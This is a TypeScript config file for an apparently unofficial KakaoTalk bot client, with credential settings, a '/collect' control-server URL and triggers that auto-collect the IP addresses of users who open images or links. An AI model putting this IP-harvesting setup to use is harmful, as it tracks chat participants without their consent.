/**
 * 🔥 CONFIGURATION MANAGER v31.2 🔥
 */

import dotenv from 'dotenv';
import { AdminConfig, TriggerConfig } from './types';

dotenv.config();

export class Config {
  // Kakao Credentials
  static readonly KAKAO_PHONE: string = process.env.KAKAO_PHONE || '';
  static readonly KAKAO_PASSWORD: string = process.env.KAKAO_PASSWORD || '';
  static readonly KAKAO_EMAIL: string = process.env.KAKAO_EMAIL || '';

  // Device Information
  static readonly DEVICE_UUID: string = process.env.DEVICE_UUID || this.generateDeviceUUID();
  static readonly DEVICE_NAME: string = process.env.DEVICE_NAME || 'EnhancedKakaoClient';

  // Control Server
  static readonly CONTROL_SERVER_URL: string = process.env.CONTROL_SERVER_URL || 'http://localhost:3000/collect';

  // Admin Configuration
  static readonly ADMIN_CONFIG: AdminConfig = {
    kakaoIds: (process.env.ADMIN_IDS || '').split(',').filter(id => id.trim()),
    permissions: ['all']
  };

  // Command Prefix
  static readonly COMMAND_PREFIX: string = process.env.COMMAND_PREFIX || '!';

  // Trigger Configuration
  static readonly TRIGGER_CONFIG: TriggerConfig = {
    triggers: {
      mention: { 
        enabled: process.env.TRIGGER_MENTION === 'true',
        autoCollect: process.env.TRIGGER_MENTION_AUTO_COLLECT === 'true'
      },
      imageRead: { 
        enabled: process.env.TRIGGER_IMAGE_READ === 'true',
        autoBlock: process.env.TRIGGER_IMAGE_AUTO_BLOCK === 'true',
        autoCollectIP: process.env.TRIGGER_IMAGE_AUTO_COLLECT_IP === 'true'
      },
      linkRead: { 
        enabled: process.env.TRIGGER_LINK_READ === 'true',
        autoBlock: process.env.TRIGGER_LINK_AUTO_BLOCK === 'true',
        autoCollectIP: process.env.TRIGGER_LINK_AUTO_COLLECT_IP === 'true'
      }
    }
  };

  private static generateDeviceUUID(): string {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  static validate(): void {
    if (!this.KAKAO_PHONE && !this.KAKAO_EMAIL) {
      throw new Error('KAKAO_PHONE or KAKAO_EMAIL must be set in .env file');
    }
    if (!this.KAKAO_PASSWORD) {
      throw new Error('KAKAO_PASSWORD must be set in .env file');
    }
    console.log('[CONFIG] Configuration validated successfully');
  }
}